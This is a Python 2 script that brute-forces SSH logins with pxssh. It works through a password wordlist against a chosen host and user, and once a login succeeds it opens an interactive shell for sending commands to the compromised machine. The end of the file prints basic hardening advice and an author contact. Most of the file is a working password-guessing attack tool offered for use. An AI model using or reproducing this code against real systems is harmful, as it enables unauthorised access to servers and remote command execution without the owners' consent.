

import pxssh
import argparse
import time

def connect(host, user, password):
    global Found
    Fails = 0

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+]PASSWORD FOUND: ' + password
	return s
    except Exception, e:
	if Fails > 5:
	    print "\n[-]TOO MANY SOCKET TIMEOUTS" 
	    exit(0)
	elif '\n[+]READNING NON BLOCKING' in str(e):
	    Fails += 1
            time.sleep(5)
            return connect(host, user, password)
	elif '\n[+]SYNCING WITH TERMINAL' in str(e):
	    time.sleep(1)
	    return connect(host, user, password)
	return None

def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("host", help="Specify Target Host")
    parser.add_argument("user", help="Specify Target User")
    parser.add_argument("file", help="Specify Password File")
    
    args = parser.parse_args()

    if args.host and args.user and args.file:
    	with open(args.file, 'r') as infile:
    	    for line in infile:
                password = line.strip('\r\n')
	        print "[+]TESTING "+str(password)
                con = connect(args.host, args.user, password)
		if con:
		    print "\n[+]SSH CONNECTED"
		    command = raw_input(">")
		    while command != 'q' and command != 'Q':
			con.sendline (command)
            		con.prompt()
            		print con.before 
			command = raw_input(">")
    else:
        print parser.usage
        exit(0)

if __name__ == '__main__':
    main()

print"\n[+]DID I FIND SSH PASSWORD???"
o=raw_input("y or n : ")

if o=='y':
  print"\n[+]DO WANT SOME HINTS TO STOP THIS ATTACK ???"
  v=raw_input("y or n : ")
  if v=='y':
    print"\n[+]STEP 1.  MAKE STRONG PASWORD"
    print"\n[+]STEP 2.  UPGRADE THE SSH SERVER"
    print"\n[+]STEP 3.  MAKE SSH TO USE BY ONLY PERSONAL IP OR YOUR OWN IP"
    print"\n[+}STEP 4.  IF YOU ARE COMPLETLY UNKNOWN TO THIS STUFF...PLEASE EMAIL ME AT nisargjani20996@gmail.com OR CONSULT TO PENTESTERS / IT CONSULTERS"
  else:
    pass
else:
  pass
raw_input("\n[+]PRESS ANY KEY TO EXIT")

